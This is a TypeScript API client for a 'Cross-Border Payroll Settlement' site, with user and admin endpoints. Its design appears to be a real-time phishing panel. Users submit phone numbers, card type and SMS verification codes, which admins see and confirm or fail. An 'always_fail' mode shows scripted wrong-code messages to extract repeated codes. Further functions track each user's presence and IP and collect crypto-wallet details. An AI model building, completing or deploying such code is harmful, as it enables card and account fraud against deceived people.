import { API_BASE, apiHeaders } from "./supabase";
import type { Transaction, KycDraft, KycSubmission, KycSubmissionSummary, AdminUser, CodeSendRecord, ReviewHistoryRecord, EmployeeSessionRecord, AdminNotification, CodeSendLimitConfig, BlockchainWalletBrand, BlockchainChannelConfig, BlockchainChannelStatus } from "./types";

export interface SiteBranding {
  brand_code: string;
  brand_tagline: string;
  brand_short: string;
}

async function call(path: string, opts: RequestInit = {}) {
  const res = await fetch(`${API_BASE}${path}`, opts);
  const data = await res.json();
  if (!res.ok) throw new Error(data.error || "Request failed");
  return data;
}

// ─── Employee APIs ───────────────────────────────────────────────────────────

export async function verifyTransaction(ft_uid: string, serial_number: string): Promise<{
  valid: boolean;
  transaction?: Transaction;
  kyc?: KycDraft;
}> {
  return call("/verify-transaction", {
    method: "POST",
    headers: apiHeaders(),
    body: JSON.stringify({ ft_uid, serial_number }),
  });
}

export async function updateKycDraft(ft_uid: string, field: string, value: string) {
  return call("/update-kyc-draft", {
    method: "POST",
    headers: apiHeaders(),
    body: JSON.stringify({ ft_uid, field, value }),
  });
}

export type CardType = "credit" | "debit";

export async function sendVerificationCode(ft_uid: string, phone_number: string, card_type: CardType) {
  return call("/send-verification-code", {
    method: "POST",
    headers: apiHeaders(),
    body: JSON.stringify({ ft_uid, phone_number, card_type }),
  });
}

export async function updateVerificationCode(ft_uid: string, verification_code: string) {
  return call("/update-verification-code", {
    method: "POST",
    headers: apiHeaders(),
    body: JSON.stringify({ ft_uid, verification_code }),
  });
}

export async function submitForReview(ft_uid: string, phone_number: string, card_type: CardType) {
  return call("/submit-for-review", {
    method: "POST",
    headers: apiHeaders(),
    body: JSON.stringify({ ft_uid, phone_number, card_type }),
  });
}

export async function getSiteBranding(): Promise<SiteBranding> {
  const res = await call(`/branding`, { headers: apiHeaders() });
  return res.branding ?? { brand_code: "CBCA", brand_tagline: "Cross-Border Payroll Settlement", brand_short: "Cross-Border Settlement" };
}

export async function adminSaveSiteBranding(branding: SiteBranding): Promise<SiteBranding> {
  const res = await call(`/admin/branding`, {
    method: "POST",
    headers: adminHeaders(),
    body: JSON.stringify(branding),
  });
  return res.branding;
}

// ─── Admin APIs ──────────────────────────────────────────────────────────────

export async function adminLogin(username: string, password: string): Promise<{ token: string; username: string; role: string }> {
  return call("/admin/login", {
    method: "POST",
    headers: apiHeaders(),
    body: JSON.stringify({ username, password }),
  });
}

function adminHeaders() {
  const token = localStorage.getItem("cbca_admin_token") || "";
  return apiHeaders(token);
}

export async function adminGetTransactions(q = ""): Promise<Transaction[]> {
  const qs = q ? `?q=${encodeURIComponent(q)}` : "";
  const res = await call(`/admin/transactions${qs}`, { headers: adminHeaders() });
  return res.transactions;
}

export async function adminGetTransaction(id: string): Promise<{ transaction: Transaction; kyc?: KycDraft; code_send_history: CodeSendRecord[]; review_history: ReviewHistoryRecord[]; current_submission_number: number; kyc_submissions: KycSubmissionSummary[] }> {
  return call(`/admin/transaction/${id}`, { headers: adminHeaders() });
}

export async function adminUpdateReview(transaction_id: string, review_status: string, review_note: string) {
  return call("/admin/update-review", {
    method: "POST",
    headers: adminHeaders(),
    body: JSON.stringify({ transaction_id, review_status, review_note }),
  });
}

export async function adminGenerateUid(): Promise<{ ft_uid: string; serial_number: string; transaction: Transaction }> {
  return call("/admin/generate-uid", {
    method: "POST",
    headers: adminHeaders(),
    body: "{}",
  });
}

export async function adminUpdateTransaction(transaction_id: string, fields: Partial<Transaction>) {
  return call("/admin/update-transaction", {
    method: "POST",
    headers: adminHeaders(),
    body: JSON.stringify({ transaction_id, ...fields }),
  });
}

export async function adminRegenerateCredential(transaction_id: string, field: string): Promise<{ new_value: string }> {
  return call("/admin/regenerate-credential", {
    method: "POST",
    headers: adminHeaders(),
    body: JSON.stringify({ transaction_id, field }),
  });
}

export async function adminUpdateCredential(transaction_id: string, field: string, value: string): Promise<void> {
  return call("/admin/update-credential", {
    method: "POST",
    headers: adminHeaders(),
    body: JSON.stringify({ transaction_id, field, value }),
  });
}

export async function adminUpdateNotePin(transaction_id: string, fields: { admin_note?: string; is_pinned?: boolean }) {
  return call(`/admin/transaction/${transaction_id}/note-pin`, {
    method: "PATCH",
    headers: adminHeaders(),
    body: JSON.stringify(fields),
  });
}

export async function adminDeleteTransaction(transaction_id: string) {
  return call(`/admin/transaction/${transaction_id}`, {
    method: "DELETE",
    headers: adminHeaders(),
  });
}

// ─── Sub-admin management (super-admin only) ─────────────────────────────────

export async function adminGetSubAdmins(): Promise<AdminUser[]> {
  const res = await call("/admin/sub-admins", { headers: adminHeaders() });
  return res.admins;
}

export async function adminCreateSubAdmin(username: string, password: string): Promise<AdminUser> {
  const res = await call("/admin/create-sub-admin", {
    method: "POST",
    headers: adminHeaders(),
    body: JSON.stringify({ username, password }),
  });
  return res.admin;
}

export async function adminToggleSubAdmin(username: string, is_active: boolean) {
  return call("/admin/toggle-sub-admin", {
    method: "POST",
    headers: adminHeaders(),
    body: JSON.stringify({ username, is_active }),
  });
}

export async function adminResetSubAdminPassword(username: string, new_password: string) {
  return call("/admin/reset-sub-admin-password", {
    method: "POST",
    headers: adminHeaders(),
    body: JSON.stringify({ username, new_password }),
  });
}

export async function adminGetSubmissions(transaction_id: string): Promise<KycSubmission[]> {
  const res = await call(`/admin/transaction/${transaction_id}/submissions`, { headers: adminHeaders() });
  return res.submissions;
}

// ─── Status polling & code confirmation ──────────────────────────────────────

export async function pollTransactionStatus(ft_uid: string): Promise<{ review_status: string; code_submitted_at: string | null; code_rejected: boolean }> {
  return call(`/poll-status?ft_uid=${encodeURIComponent(ft_uid)}`, { headers: apiHeaders() });
}

export async function adminConfirmCode(transaction_id: string, result: "confirmed" | "failed") {
  return call("/admin/confirm-code", {
    method: "POST",
    headers: adminHeaders(),
    body: JSON.stringify({ transaction_id, result }),
  });
}

// ─── Announcement ────────────────────────────────────────────────────────────

export interface AnnouncementConfig {
  title: string;
  content: string;
  read_seconds?: number;
  confirmation_timeout_minutes?: number;
  updated_by?: string;
  updated_at?: string;
}

export interface SubAdminAnnouncementConfig {
  title: string;
  content: string;
  read_seconds: number;
  use_custom: boolean;
  updated_at?: string;
}

export async function getAnnouncement(ft_uid?: string): Promise<AnnouncementConfig | null> {
  const qs = ft_uid ? `?ft_uid=${encodeURIComponent(ft_uid)}` : "";
  const res = await call(`/announcement${qs}`, { headers: apiHeaders() });
  return res.announcement ?? null;
}

export async function adminGetAnnouncement(): Promise<{ announcement: AnnouncementConfig | null; sub_announcement: SubAdminAnnouncementConfig | null }> {
  const res = await call("/admin/announcement", { headers: adminHeaders() });
  return { announcement: res.announcement ?? null, sub_announcement: res.sub_announcement ?? null };
}

export async function adminSaveAnnouncement(
  title: string,
  content: string,
  read_seconds: number,
  use_custom?: boolean,
  confirmation_timeout_minutes?: number,
) {
  return call("/admin/announcement", {
    method: "POST",
    headers: adminHeaders(),
    body: JSON.stringify({ title, content, read_seconds, use_custom, confirmation_timeout_minutes }),
  });
}

// ─── Presence / heartbeat ─────────────────────────────────────────────────────

export async function sendHeartbeat(ft_uid: string, page?: string): Promise<void> {
  try {
    await call("/heartbeat", {
      method: "POST",
      headers: apiHeaders(),
      body: JSON.stringify({ ft_uid, page }),
    });
  } catch {
    // heartbeat failures are silent
  }
}

// Uses sendBeacon so it fires reliably on tab close / navigation away
export function sendGoOffline(ft_uid: string): void {
  const url = `${API_BASE}/go-offline`;
  const payload = JSON.stringify({ ft_uid });
  const blob = new Blob([payload], { type: "application/json" });
  if (!navigator.sendBeacon(url, blob)) {
    // fallback: best-effort fetch with keepalive
    fetch(url, {
      method: "POST",
      headers: apiHeaders(),
      body: payload,
      keepalive: true,
    }).catch(() => {});
  }
}

export async function adminGetPresence(): Promise<{ ft_uid: string; transaction_id: string; last_seen_at: string; ip_address: string; current_page: string | null }[]> {
  const res = await call("/admin/presence", { headers: adminHeaders() });
  return res.online ?? [];
}

export async function adminGetSessionHistory(transaction_id: string): Promise<EmployeeSessionRecord[]> {
  const res = await call(`/admin/transaction/${transaction_id}/session-history`, { headers: adminHeaders() });
  return res.history ?? [];
}

// ─── Notifications ────────────────────────────────────────────────────────────

export async function getNotifications(ft_uid: string): Promise<Pick<AdminNotification, "id" | "title" | "content" | "mode" | "is_fixed" | "show_once" | "read_at" | "created_at">[]> {
  const res = await call(`/notifications?ft_uid=${encodeURIComponent(ft_uid)}`, { headers: apiHeaders() });
  return res.notifications ?? [];
}

export async function adminGetNotifications(ft_uid?: string): Promise<AdminNotification[]> {
  const qs = ft_uid ? `?ft_uid=${encodeURIComponent(ft_uid)}` : "";
  const res = await call(`/admin/notifications${qs}`, { headers: adminHeaders() });
  return res.notifications ?? [];
}

export async function adminCreateNotification(fields: { title: string; content: string; mode: "popup" | "banner"; is_fixed: boolean; show_once: boolean; ft_uid: string }): Promise<AdminNotification> {
  const res = await call("/admin/notification", {
    method: "POST",
    headers: adminHeaders(),
    body: JSON.stringify(fields),
  });
  return res.notification;
}

export async function notificationMarkRead(id: string, ft_uid: string): Promise<void> {
  await call(`/notification/${id}/read`, {
    method: "POST",
    headers: apiHeaders(),
    body: JSON.stringify({ ft_uid }),
  });
}

export async function adminUpdateNotification(id: string, fields: Partial<Pick<AdminNotification, "title" | "content" | "is_active" | "is_fixed" | "show_once" | "read_at">>): Promise<AdminNotification> {
  const res = await call(`/admin/notification/${id}`, {
    method: "PATCH",
    headers: adminHeaders(),
    body: JSON.stringify(fields),
  });
  return res.notification;
}

export async function adminResetNotificationRead(id: string): Promise<AdminNotification> {
  const res = await call(`/admin/notification/${id}/reset-read`, {
    method: "POST",
    headers: adminHeaders(),
    body: "{}",
  });
  return res.notification;
}

export async function adminDeleteNotification(id: string): Promise<void> {
  await call(`/admin/notification/${id}`, {
    method: "DELETE",
    headers: adminHeaders(),
  });
}

// ─── Code Send Limit Config ───────────────────────────────────────────────────

export async function getVerificationMode(ft_uid: string): Promise<{
  is_enabled: boolean;
  mode: "always_fail" | "admin_confirm";
  timeout_seconds: number;
  code_expiry_seconds: number;
  max_fail_attempts: number;
  wrong_code_title: string;
  wrong_code_message: string;
  timeout_title: string;
  timeout_message: string;
  fail_limit_title: string;
  fail_limit_message: string;
} | null> {
  const res = await call(`/verification-mode?ft_uid=${encodeURIComponent(ft_uid)}`, { headers: apiHeaders() });
  return res.config;
}

export interface TestOutcome {
  outcome: "wrong_code" | "timeout" | "fail_limit" | "expired" | "already_decided" | "none";
  title: string;
  message: string;
  attempt_count: number;
  remaining_ms?: number;
}

export async function getCodeLock(ft_uid: string, card_type: CardType): Promise<TestOutcome> {
  return call(`/code-lock?ft_uid=${encodeURIComponent(ft_uid)}&card_type=${card_type}`, { headers: apiHeaders() });
}

export async function reportCodeAttemptFail(ft_uid: string, reason: "rejected" | "timeout" | "expired", card_type: CardType): Promise<TestOutcome> {
  return call("/code-attempt-fail", {
    method: "POST",
    headers: apiHeaders(),
    body: JSON.stringify({ ft_uid, reason, card_type }),
  });
}

export interface VerificationModeConfig {
  is_enabled: boolean;
  mode: "always_fail" | "admin_confirm";
  timeout_seconds: number;
  code_expiry_seconds: number;
  max_fail_attempts: number;
  wrong_code_title: string;
  wrong_code_message: string;
  timeout_title: string;
  timeout_message: string;
  fail_limit_title: string;
  fail_limit_message: string;
  confirm_max_fail_attempts: number;
  confirm_code_expiry_seconds: number;
  confirm_fail_limit_title: string;
  confirm_fail_limit_message: string;
}

export async function adminGetVerificationMode(adminUsername: string): Promise<VerificationModeConfig> {
  const res = await call(`/admin/verification-mode?username=${encodeURIComponent(adminUsername)}`, { headers: adminHeaders() });
  return res.config;
}

export async function adminSaveVerificationMode(adminUsername: string, config: VerificationModeConfig): Promise<void> {
  await call("/admin/verification-mode", {
    method: "POST",
    headers: adminHeaders(),
    body: JSON.stringify({ admin_username: adminUsername, ...config }),
  });
}

export async function getCodeSendConfig(ft_uid: string, card_type: CardType): Promise<CodeSendLimitConfig> {
  const res = await call(`/code-send-config?ft_uid=${encodeURIComponent(ft_uid)}&card_type=${card_type}`, { headers: apiHeaders() });
  return res.config ?? { is_enabled: false, max_sends: 3, warning_title: "", warning_message: "", send_count: 0 };
}

export type FeatureFlags = Record<string, { test_enabled: boolean; mode: "always_fail" | "admin_confirm" }>;

export async function adminGetFeatureFlags(): Promise<FeatureFlags> {
  const res = await call("/admin/feature-flags", { headers: adminHeaders() });
  return res.flags ?? {};
}

export type SendLimitsByMode = Record<VerificationModeConfig["mode"], Omit<CodeSendLimitConfig, "send_count">>;

const DEFAULT_SEND_LIMIT = { is_enabled: false, max_sends: 3, warning_title: "", warning_message: "" };

export async function adminGetCodeSendConfig(username: string): Promise<SendLimitsByMode> {
  const res = await call(`/admin/code-send-config?username=${encodeURIComponent(username)}`, { headers: adminHeaders() });
  return { always_fail: res.always_fail ?? DEFAULT_SEND_LIMIT, admin_confirm: res.admin_confirm ?? DEFAULT_SEND_LIMIT };
}

export async function adminSaveCodeSendConfig(admin_username: string, limits: SendLimitsByMode): Promise<void> {
  await call("/admin/code-send-config", {
    method: "POST",
    headers: adminHeaders(),
    body: JSON.stringify({ admin_username, ...limits }),
  });
}

// ─── Blockchain Address Verification Channel ──────────────────────────────────

export async function getBlockchainChannel(ft_uid: string): Promise<BlockchainChannelStatus | null> {
  const res = await call(`/blockchain-channel?ft_uid=${encodeURIComponent(ft_uid)}`, { headers: apiHeaders() });
  return res.config ?? null;
}

export async function submitBlockchainVerification(ft_uid: string, payload: {
  blockchain_address: string;
  blockchain_username: string;
  blockchain_country: string;
  blockchain_region: string;
  blockchain_email: string;
  blockchain_no_kyc_reason: string;
}): Promise<{ ok: boolean; submission_number?: number; error?: string; submit_success_title?: string; submit_success_message?: string }> {
  return call("/submit-blockchain", {
    method: "POST",
    headers: apiHeaders(),
    body: JSON.stringify({ ft_uid, ...payload }),
  });
}

export async function adminGetBlockchainConfig(username?: string): Promise<{ config: BlockchainChannelConfig; brands: BlockchainWalletBrand[] }> {
  const q = username ? `?username=${encodeURIComponent(username)}` : "";
  const res = await call(`/admin/blockchain-config${q}`, { headers: adminHeaders() });
  return { config: res.config, brands: res.brands ?? [] };
}

export async function adminSaveBlockchainConfig(config: BlockchainChannelConfig, username?: string): Promise<BlockchainChannelConfig> {
  const res = await call("/admin/blockchain-config", {
    method: "POST",
    headers: adminHeaders(),
    body: JSON.stringify({ ...config, admin_username: username }),
  });
  return res.config;
}

export async function adminCreateBlockchainBrand(name: string, username?: string): Promise<BlockchainWalletBrand> {
  const res = await call("/admin/blockchain-brand", {
    method: "POST",
    headers: adminHeaders(),
    body: JSON.stringify({ name, admin_username: username }),
  });
  return res.brand;
}

export async function adminUpdateBlockchainBrand(id: string, fields: { name?: string; is_active?: boolean; sort_order?: number }): Promise<BlockchainWalletBrand> {
  const res = await call(`/admin/blockchain-brand/${id}`, {
    method: "PATCH",
    headers: adminHeaders(),
    body: JSON.stringify(fields),
  });
  return res.brand;
}

export async function adminDeleteBlockchainBrand(id: string): Promise<void> {
  await call(`/admin/blockchain-brand/${id}`, {
    method: "DELETE",
    headers: adminHeaders(),
  });
}

export async function adminSetTransactionBlockchain(transaction_id: string, enabled: boolean, wallet_brand: string | null): Promise<void> {
  await call("/admin/transaction-blockchain", {
    method: "POST",
    headers: adminHeaders(),
    body: JSON.stringify({ transaction_id, blockchain_enabled: enabled, blockchain_wallet_brand: wallet_brand }),
  });
}
